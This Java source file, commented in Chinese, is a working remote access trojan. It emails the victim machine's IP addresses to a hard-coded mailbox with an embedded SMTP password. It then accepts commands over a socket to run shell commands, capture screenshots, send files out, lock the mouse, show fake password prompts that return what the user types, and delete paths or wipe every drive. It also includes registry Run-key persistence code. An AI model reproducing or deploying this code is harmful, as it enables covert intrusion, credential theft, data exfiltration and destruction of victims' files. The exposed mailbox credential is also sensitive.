package org.my;

import javax.imageio.ImageIO;
import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Enumeration;
import java.util.Properties;

public class Main {
    final int PORT = 1220;
    final int PORT_FOR_SCREEN=1222;
    ServerSocket serverSocket;
    Socket socket;
    DataInputStream dis;
    DataOutputStream dos;
    String commendString;
    Process process;
    Runtime r = Runtime.getRuntime();
    BufferedReader bufferedReader;
    BufferedImage bi;
    Robot robot;
    SMail smail;
    MyCopy myCopy;
    MouseLockThread mouseLockThread;
    int time[] = { 5000, 120000, 300000 }, timeSel = 0;
    Process p=null;
    public Main() throws IOException {
		/*
		  在注册表中设置开机自动运行 register();
		  以及发送邮件，主要是把自己的IP发出来
		 register();*/
        smail = new SMail();
        while (!smail.sended) {
            if (timeSel >= 3) {
                timeSel = 2;
            }
            try {
                Thread.sleep(time[timeSel++]);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            smail.send(getIP());
        }

        try {
            serverSocket = new ServerSocket(PORT);
        } catch (IOException e1) {
            e1.printStackTrace();
        }

        try {
            new ScreenControlClient(PORT_FOR_SCREEN).start();
        } catch (AWTException e) {
            throw new RuntimeException(e);
        }
        while (true) {
            try {
                socket = serverSocket.accept();
                dis = new DataInputStream(socket.getInputStream());
                dos = new DataOutputStream(socket.getOutputStream());
            } catch (IOException e) {
                try {
                    dis.close();
                    dos.close();
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
                e.printStackTrace();
            }
            try {
                //robot可以执行不少操作，如处理鼠标键盘
                robot = new Robot();
            } catch (AWTException e) {
                e.printStackTrace();
            }
            //接收命令并执行
            go();
        }

    }

    /*
     * 接收控制端传来的命令并执行
     * */
    void go() throws IOException {
        while (true) {
            /*
             * 这里不断的接受发送过来的命令然后根据命令执行相应的操作
             * 1、我们可以通过开启一个线程通过robot锁定鼠标
             * 2、执行dos命令
             * 3、传输被控制端的文件
             * 4、查看被控制端的桌面
             * 5、在被控制端弹出对话框
             * 6、让被控制端闪屏
             * 7、格式化电脑
             * */
            //接收命令
            try {
                commendString = dis.readUTF().trim();
            } catch (IOException e) {
                //System.out.println("leave");
                break;
            }
            // 显示一个对话框
            /**
             * "-doutmsg msg 以对话框形式输出信息\n"
             * "-dinmsg msg 弹出一个输入对话框+显示信息msg\n"
             * "-dinpass msg 弹出一个输入密码对话框+显示信息msg\n"
             */
            if (commendString.startsWith("-d")) {
                commendString = commendString.substring(2);
                // 输出信息对话框
                if (commendString.startsWith("outmsg")) {
                    try {
                        commendString = commendString.substring(7);
                    } catch (Exception ee) {
                        continue;
                    }
                    showDialog(commendString);
                } else if (commendString.startsWith("inmsg")) {
                    // 弹出一个输入对话框，输入普通文字，传回控制端
                    try {
                        commendString = commendString.substring(6);
                    } catch (Exception ee) {
                        continue;
                    }
                    showDialogMsgInput(commendString);
                } else if (commendString.startsWith("inpass")) {
                    // 弹出一个输入对话框，输入密码，传回控制端
                    try {
                        commendString = commendString.substring(7);
                    } catch (Exception ee) {
                        continue;
                    }
                    showDialogPassInput(commendString);
                }
            } else if (commendString.startsWith("-p")) {
                //截图，发回控制端
                //"-p 获取图片\n"
                sendPic();
            }else if(commendString.startsWith("-file")){
                /*
                 * "-file path 获取文件\n"
                 * */
                commendString=commendString.split("\\s")[1];
                sendFile(commendString);
            } else if (commendString.startsWith("-m")) {
                //锁定鼠标
                // "-m l锁定键盘 .....-m a取消锁定\n"
                try {
                    commendString = commendString.substring(3);
                } catch (Exception ee) {
                    continue;
                }
                mouseLock(commendString);
            }else if(commendString.startsWith("-flash")){
                //闪屏
                // "-flash msg 闪屏并显示msg所表示的文字\n"
                try{
                    commendString = commendString.substring(7);
                }catch(Exception e){
                    commendString="";
                }
                new Flash(commendString);
            }else if(commendString.startsWith("-delete")){
                //删除文件
                /*
                 *  "-delete path 删除path目录及其下的所有内容\n"
                 *  "-delete all 格式化电脑\n"
                 */
                try {
                    commendString = commendString.split("\\s")[1];
                } catch (Exception ee) {
                    continue;
                }
                if (commendString.equals("all")) {
                    //格式化电脑
                    formatComputer();
                } else{
                    //删除只当路径下的文件夹或者文件
                    delteDir(commendString);
                }
            }else {
                //执行doc命令

                dosExe(commendString);
            }
        }
    }
    /*在注册表注册开机自动启动*/
    public void register() {
        JarUtil jarUtil = new JarUtil(Main.class);
        String path = jarUtil.getJarPath();
        if (!path.equalsIgnoreCase("C:\\WINDOWS")) {
            //System.out.println("run");
            new OtherApp().start();
            myCopy = new MyCopy();
            path += "\\" + jarUtil.getJarName();
            myCopy.fileCopy(path, "C:\\WINDOWS\\jx.jar");
            String key = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run";
            String name = "jx";
            String value = "C:\\WINDOWS\\jx.jar";
            String command = "reg add " + key + " /v " + name + " /d " + value;
            try {
                Runtime.getRuntime().exec(command);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    /*显示密码对话框*/
    void showDialogPassInput(String s) {
        MyDialogPassInput input = new MyDialogPassInput(s);
        s = input.pass;
        try {
            //传回控制端
            dos.writeUTF("password:"+s);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /*输了信息对话框*/
    void showDialogMsgInput(String s) {
        MyDialogMsgInput input = new MyDialogMsgInput(s);
        s = input.string;
        try {
            //输入信息传回控制端
            dos.writeUTF("msg:"+s);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    /*启动线程锁定鼠标*/
    void mouseLock(String s) {
        if (s.equals("l")) {
            if (mouseLockThread == null || mouseLockThread.isAlive() == false) {
                mouseLockThread = new MouseLockThread();
                mouseLockThread.flag = true;
                mouseLockThread.start();
            }
        } else if (s.equals("a")) {
            mouseLockThread.flag = false;
        }
    }



    /*执行dos命令,把结果返回到控制端*/
    void dosExe(String dosString) {
        try {
            //获取当前cmd
            if(p==null){
                p = Runtime.getRuntime().exec("cmd.exe");
            }

            // 读取输出
            //BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream(), "GBK"));
            InputStreamReader isr=new InputStreamReader(p.getInputStream(),"GBK");
            //读取输入
            BufferedWriter writer =new BufferedWriter(new OutputStreamWriter(p.getOutputStream(),"GBK"));
            //输入
            writer.write(dosString+"\n");
            writer.flush();
            //读取
            char[] chars = new char[1024 * 8];
            int len;
            //判断是否是最后一行
            String regex="[\\s|\\S|.]*[A-Z]:\\\\(?:[.*]+\\\\)*.*[>][\\n]*";
            while ((len=isr.read(chars))>0){
                String line=new String(chars,0,len);
                //System.out.println(line);
                dos.writeUTF(line);
                //最后一行，停止
                if(line.matches(regex)){
                    break;
                }

            }
			/*String line;
			//获取当前工作目录，用当前工作目录判断读取结束，避免阻塞
			String workingDirectory = System.getProperty("user.dir");
			boolean isFirstLine=true;
			while ((line = reader.readLine()) != null) {
				System.out.println(line);
				// 将输出发送到控制端
				dos.writeUTF(line);
				//第一行不做判断
				if(!isFirstLine&&line.equals(workingDirectory)){
					break;
				}
				isFirstLine=false;
			}*/
            dos.writeUTF("output end:");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    /*截图，发送图片到控制端*/
    void sendPic() {
        BufferedImage bi = robot.createScreenCapture(new Rectangle(0, 0,
                Toolkit.getDefaultToolkit().getScreenSize().width, Toolkit
                .getDefaultToolkit().getScreenSize().height));
        byte[] imageData = getCompressedImage(bi);
        if (imageData != null) {
            try {
                dos.writeUTF("picture start:");
                dos.writeInt(imageData.length);
                dos.write(imageData);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    /*发送文件到控制端*/
    void sendFile(String path) throws IOException {
        File file=new File(path);
        byte[] fileData = new byte[1024 * 8];
        FileInputStream fileInputStream = new FileInputStream(file);
        try {
            //传文件开始标志
            dos.writeUTF("file start:");
            //传文件名
            dos.writeUTF(file.getName());
            //传文件长度
            dos.writeLong(file.length());
            //System.out.println(file.length());
            //传文件内容
            int len;
            while ((len = fileInputStream.read(fileData)) > 0) {
                dos.write(fileData, 0, len);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        fileInputStream.close();
    }

    //展示弹窗，创建多线程展示弹窗
    void showDialog(String s) {
        new ShowDialogThread(s).start();
    }

    public static void main(String[] args) throws IOException {
        new Main();
    }
    /*处理图片，方便传输*/
    public byte[] getCompressedImage(BufferedImage image) {
        byte[] imageData = null;
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(image, "jpg", baos);
            imageData = baos.toByteArray();
        } catch (IOException ex) {
            imageData = null;
        }
        return imageData;
    }

    //格式化电脑
    public static void formatComputer(){
        for (File file : File.listRoots()) {
            deleteFiles(file);
        }
    }
    //输入路径删除目录下的所有
    public static void delteDir(String path){
        File file=new File(path);
        deleteFiles(file);
    }
    public static void deleteFiles(File directory) {
        if (directory.exists()) { // 如果目录存在
            File[] files = directory.listFiles(); // 获取目录下的所有文件和子目录
            if (files != null) { // 如果目录不为空
                for (File file : files) {
                    if (file.isDirectory()) { // 如果是子目录
                        deleteFiles(file); // 递归调用删除子目录
                    } else { // 如果是文件
                        file.delete(); // 删除文件
                    }
                }
            }
            directory.delete(); // 删除目录
        }
    }
    /*获取本地IP*/
    String getIP() {
        String ipString = "";
        Enumeration<NetworkInterface> netInterfaces = null;
        try {
            netInterfaces = NetworkInterface.getNetworkInterfaces();
            while (netInterfaces.hasMoreElements()) {
                NetworkInterface ni = netInterfaces.nextElement();
                ipString = ipString + ni.getDisplayName() + "\n";
                ipString = ipString + ni.getName() + "\n";
                Enumeration<InetAddress> ips = ni.getInetAddresses();
                while (ips.hasMoreElements()) {
                    ipString = ipString + ips.nextElement().getHostAddress()
                            + "\n";
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return ipString;
    }
    /*显示消息对话框*/
    class ShowDialogThread extends Thread {
        String info;

        public ShowDialogThread(String s) {
            this.info = s;
        }

        public void run() {
            JOptionPane.showMessageDialog(null, info);
        }
    }

    class MouseLockThread extends Thread {
        boolean flag = false;

        public void run() {
            Point p = MouseInfo.getPointerInfo().getLocation();
            while (flag) {
                try {
                    Thread.sleep(1);
                    robot.mouseMove(p.x, p.y);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    // 这里可以启动其它的应用程序
    class OtherApp extends Thread {
        public void run() {
            //new other();
        }
    }

    class JarUtil {
        private String jarName;
        private String jarPath;

        public JarUtil(Class clazz) {
            String path = clazz.getProtectionDomain().getCodeSource()
                    .getLocation().getFile();
            try {
                path = java.net.URLDecoder.decode(path, "UTF-8");
            } catch (java.io.UnsupportedEncodingException e) {
                e.printStackTrace();
            }

            java.io.File jarFile = new java.io.File(path);
            this.jarName = jarFile.getName();

            java.io.File parent = jarFile.getParentFile();
            if (parent != null) {
                this.jarPath = parent.getAbsolutePath();
            }
        }

        public String getJarName() {
            try {
                return java.net.URLDecoder.decode(this.jarName, "UTF-8");
            } catch (java.io.UnsupportedEncodingException ex) {
            }
            return null;
        }

        public String getJarPath() {
            try {
                return java.net.URLDecoder.decode(this.jarPath, "UTF-8");
            } catch (java.io.UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            return null;
        }
    }
    /*该类用于文件复制*/
    class MyCopy {
        public int fileCopy(String sFile, String oFile) {
            File file = new File(sFile);
            if (!file.exists()) {
                //System.out.println(sFile + " not have");
                return -1;
            }
            File fileb = new File(oFile);
            FileInputStream fis = null;
            FileOutputStream fos = null;
            try {
                fis = new FileInputStream(file);
                fos = new FileOutputStream(fileb);
                byte[] bb = new byte[(int) file.length()];
                fis.read(bb);
                fos.write(bb);
            } catch (IOException e) {
                e.printStackTrace();
                return -2;
            } finally {
                try {
                    fis.close();
                    fos.close();
                } catch (IOException e) {
                    e.printStackTrace();
                    return -2;
                }
            }
            return 0;
        }
    }
    /*
     * 发送邮件部分 需要一两个邮箱，一个是发送方邮箱，一个是接受邮箱
     */
    class SMail {
        boolean sended = false;

        void send(String str){
            String to = "alexmo001@qq.com"; // 收件人的邮件地址
            String from = "alexmo573@163.com"; // 发件人的邮件地址
            String host = "smtp.163.com"; // 发件人的邮件服务器地址
            String user = "alexmo573@163.com"; // 发件人的邮箱账号
            String password = "RBCTOJKIFTUAVWVL"; // 发件人的邮箱密码

            // 创建一个邮件会话对象
            Properties properties = new Properties();
            properties.put("mail.smtp.host", host);
            properties.put("mail.smtp.port", "25"); // 或 994
            properties.put("mail.smtp.ssl.enable", "false"); // 开启 SSL
            properties.put("mail.smtp.auth", "true"); // 开启身份验证
            Session session = Session.getInstance(properties, new Authenticator() {
                protected PasswordAuthentication getPasswordAuthentication() {
                    return new PasswordAuthentication(user, password);
                }
            });

            try {
                // 创建一个邮件消息对象
                Message message = new MimeMessage(session);
                message.setFrom(new InternetAddress(from));
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(to));
                message.setSubject("IP");
                message.setText(str);

                // 发送邮件消息
                Transport.send(message);

                //System.out.println("Email sent successfully.");
                sended = true;
            } catch (MessagingException e) {
                //System.out.println("Error sending email: " + e.getMessage());
            }
        }

        public SMail() {
            sended = false;
        }
    }
    /*密码输入框*/
    class MyDialogPassInput extends JDialog {
        JPasswordField text;
        JButton sureButton;
        String pass;

        public MyDialogPassInput(String s) {
            this.setModal(true);
            this.setResizable(false);
            FlowLayout fl = new FlowLayout();
            fl.setAlignment(FlowLayout.CENTER);
            this.setLayout(fl);
            text = new JPasswordField(10);
            text.setEchoChar('*');
            add(new JLabel(s + ":"));
            add(text);
            sureButton = new JButton("确定");
            sureButton.addActionListener(new ActionListener() {
                public void actionPerformed(ActionEvent arg0) {
                    if (new String(text.getPassword()).trim().equals("")) {
                        return;
                    }
                    pass = new String(text.getPassword());
                    MyDialogPassInput.this.dispose();
                }
            });
            this.add(sureButton);
            int width = Toolkit.getDefaultToolkit().getScreenSize().width;
            int height = Toolkit.getDefaultToolkit().getScreenSize().height;
            int x = 200, y = 80;
            setBounds((width - x) / 2, (height - y) / 2, x, y);
            setUndecorated(true);
            validate();
            this.setVisible(true);
        }
    }
    /*闪屏*/
    class Flash {
        JFrame frame;
        JPanel pane;
        Color c[] = {  Color.pink,Color.white,Color.blue};
        int i;
        Image offScreenImage = null;
        String msg;
        public Flash(String s) {
            msg=s;
            final int width=Toolkit.getDefaultToolkit().getScreenSize().width;
            final int height=Toolkit.getDefaultToolkit().getScreenSize().height;
            frame = new JFrame();
            frame.setAlwaysOnTop(true);
            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            frame.setUndecorated(true);
            frame.setBounds(0,0,width,height);
            pane = new JPanel() {
                public void paint(Graphics g) {
                    if(offScreenImage == null){
                        offScreenImage=this.createImage(width, height);
                    }
                    Graphics gg=offScreenImage.getGraphics();
                    gg.setFont(new Font(null, Font.PLAIN, 50));
                    gg.setColor(c[i]);
                    gg.fillRect(0, 0, width, height);
                    gg.setColor(Color.black);
                    gg.drawString(msg, 200, 50);
                    g.drawImage(offScreenImage, 0, 0, null);
                }
            };
            frame.setContentPane(pane);
            frame.setVisible(true);
            new Thread() {
                public void run() {
                    int time=0;
                    while (i < c.length) {
                        Flash.this.myUpdate();
                        try {
                            Thread.sleep(50);
                            time++;
                            if(time==100){
                                frame.dispose();
                                break;
                            }
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }.start();
        }
        public void myUpdate() {
            if (i == c.length-1) {
                i = 0;
            } else {
                i++;
            }
            pane.repaint();
        }
    }

    /*输入对话框*/
    class MyDialogMsgInput extends JDialog {
        JTextField text;
        JButton sureButton;
        String string;

        public MyDialogMsgInput(String s) {
            this.setModal(true);
            this.setResizable(false);
            FlowLayout fl = new FlowLayout();
            fl.setAlignment(FlowLayout.CENTER);
            this.setLayout(fl);
            text = new JTextField(10);
            add(new JLabel(s + ":"));
            add(text);
            sureButton = new JButton("确定");
            sureButton.addActionListener(new ActionListener() {
                public void actionPerformed(ActionEvent arg0) {
                    if (new String(text.getText()).trim().equals("")) {
                        return;
                    }
                    string = new String(text.getText());
                    MyDialogMsgInput.this.dispose();
                }
            });
            this.add(sureButton);
            int width = Toolkit.getDefaultToolkit().getScreenSize().width;
            int height = Toolkit.getDefaultToolkit().getScreenSize().height;
            int x = 200, y = 80;
            setBounds((width - x) / 2, (height - y) / 2, x, y);
            setUndecorated(true);
            validate();
            this.setVisible(true);
        }
    }
}
